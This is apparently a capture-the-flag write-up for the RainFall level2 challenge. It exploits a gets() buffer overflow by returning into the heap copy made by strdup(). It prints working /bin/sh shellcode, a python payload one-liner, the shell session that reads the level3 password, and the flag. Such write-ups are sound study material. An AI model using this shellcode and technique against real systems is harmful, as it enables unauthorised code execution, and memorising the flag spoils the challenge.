# **Level2**

In this level, we found a binary that takes input and prints it:

```bash
level2@RainFall:~$ ./level2
ewewe
ewewe
level2@RainFall:~$

```

## **Binary Analysis**

Using GDB, we analyzed the binary and found that the `main` function simply calls the function **`p`**:

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret

```

After examining the `p` function, we found that the program uses **`gets()`** to retrieve the input and duplicates it using **`strdup()`**, which allocates memory on the heap:

```nasm
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp        ; reserves 104 bytes on stack
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax  ; eax = buffer address (-76 bytes)
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt> ; read input into buffer
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   ...
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax  ; prepare to duplicate input
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt> ; Duplicate input
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

Using `ltrace`, we determined that **`strdup()`** returns the address **`0x0804a008`**, which is our target address in the heap:

```bash
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7b4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                = 0
gets(0xbffff6bc, 0, 0, 0xb7e5ec73, 0x80482b5)                    = 0xbffff6bc
puts("")                                                          = 1
strdup("")                                                        = 0x0804a008
+++ exited (status 8) +++0
```

## **Vulnerability**

The main vulnerability is the use of **`gets()`**, which allows for a buffer overflow. Although we cannot directly jump to the stack due to the protection check, we can leverage **`strdup()`**, which copies our input to the heap.

## Exploit

To exploit this vulnerability:

1. Create shellcode that spawns a shell.
2. Place the shellcode at the start of our input.
3. Add padding to reach the return address.
4. Overwrite the return address with the heap address where **`strdup()`** copies our input.

**Padding**

The padding is used to fill the remaining buffer space and overwrite the saved EBP:

- **Buffer Size**: 76 bytes.
- **Shellcode Size**: 21 bytes.
- **Padding Size**: `76 - 21 = 55 bytes` (fills the rest of the buffer).
- Additional 4 bytes are needed to overwrite the saved EBP, making the total padding size **59 bytes**.

(The **4 additional bytes** in the padding represent the **saved EBP**, which lies between the buffer and the return address.)

Shellcode Exploit

```bash
# Shellcode to execute /bin/sh (21 bytes)
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

# Padding (59 bytes)
padding = "A" * 59

# Return address (heap address where strdup copies our input)
ret_addr = "\x08\xa0\x04\x08"

# Final exploit
exploit = shellcode + padding + ret_addr
```

**Steps to Execute**

1. Create the exploit file:

```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit

```

1. Run the exploit:

```bash
cat /tmp/exploit - | ./level2

```

1. Result

```bash
level2@RainFall:~$ cat /tmp/exploit - | ./level2
j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
^C

```

## Flag

```bash
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```